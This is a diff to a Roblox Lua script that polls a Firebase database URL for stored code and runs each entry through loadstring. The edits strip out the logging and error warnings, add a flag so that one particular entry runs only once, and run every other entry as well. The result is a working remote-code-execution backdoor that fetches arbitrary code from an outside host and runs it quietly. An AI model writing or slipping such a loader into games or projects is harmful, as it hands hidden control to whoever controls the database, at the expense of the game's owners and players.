@@ -1,6 +1,7 @@
 local HttpService = game:GetService("HttpService")
 
 local FIREBASE_URL = "https://uwuwi-ae227-default-rtdb.firebaseio.com/scripts"
+local a = false
 
 local function GetScripts()
     local response = HttpService:RequestAsync({
@@ -31,14 +32,15 @@ local function ListenForScripts()
 
         if scripts then
             for id, data in pairs(scripts) do
-                if data.read == false and data.code and id ~= "-OeiB316YgfmSpvVwFBi' then
-                    print("Nuevo script desde Firebase:", id)
+                if data.read == false and data.code then
+                  if id == "-OeiB316YgfmSpvVwFBi" then
+                    if not a then
 
                     local fn = loadstring(data.code)
                     if fn then
                         local success, err = pcall(fn)
-                        if not success then
-                            warn("Error ejecutando script remoto:", err)
+                        if  success then
+                          a = true
                         end
                     else
                         warn("Script inválido (remoto)")
@@ -46,6 +48,22 @@ local function ListenForScripts()
                     if id ~= "-OeiB316YgfmSpvVwFBi" then
                     MarkAsRead(id)
                     end
+                    end
+                  else
+                    local fn = loadstring(data.code)
+                    if fn then
+                        local success, err = pcall(fn)
+                        if  success then
+                          
+                        end
+                    else
+                        warn("Script inválido (remoto)")
+                    end
+                    if id ~= "-OeiB316YgfmSpvVwFBi" then
+                    MarkAsRead(id)
+                    end
+                end
+                  
                 end
             end
         end
